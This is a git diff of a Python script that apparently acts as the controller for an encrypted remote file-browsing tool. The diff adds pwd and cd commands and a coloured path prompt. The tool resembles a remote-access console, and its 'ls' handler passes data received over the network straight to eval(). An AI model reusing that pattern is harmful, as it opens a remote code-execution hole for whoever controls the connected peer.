@@ -2,8 +2,17 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import utils
 import socket
+
+class color:
+    BLACK = "\u001b[30m"
+    RED = "\u001b[31m"
+    GREEN = "\u001b[32m"
+    YELLOW = "\u001b[33m"
+    BLUE = "\u001b[34m"
+    MAGENTA = "\u001b[35m"
+    CYAN = "\u001b[36m"
+    WHITE = "\u001b[37m"
 
 def connSetup():
     server_socket = socket.socket(socket.AF_INET, 
@@ -52,17 +61,32 @@ client_socket, server_socket, privateKey, remoteKey = connSetup()   # Start Conn
 
 # Main Code
 while True:
-    command = input(" > ")
+    path = client_socket.recv(8192)
+    path = decrypt(path)
+    data = input(f"{color.BLUE}{path} >{color.WHITE} ")
+    data = data.split(" ")
+    command = data[0]
+
     if command == "ls":
         client_socket.send(crypt("ls".encode())) 
         response = client_socket.recv(8192)
         response = decrypt(response)
         response = eval(response)
         for i in range(0, len(response)): print(response[i])
+
+    elif command == "pwd":
+        client_socket.send(crypt("pwd".encode()))
+        response = client_socket.recv(8192)
+        response = decrypt(response)
+        print(response)
+
+    elif command == "cd":
+        client_socket.send(crypt(str(data).encode()))
+
     elif command == "exit":
         print("Cleaning....")
         client_socket.send(crypt("sleep".encode()))
         break
 
 
-server_socket.close()   # Clean Connection
+server_socket.close()
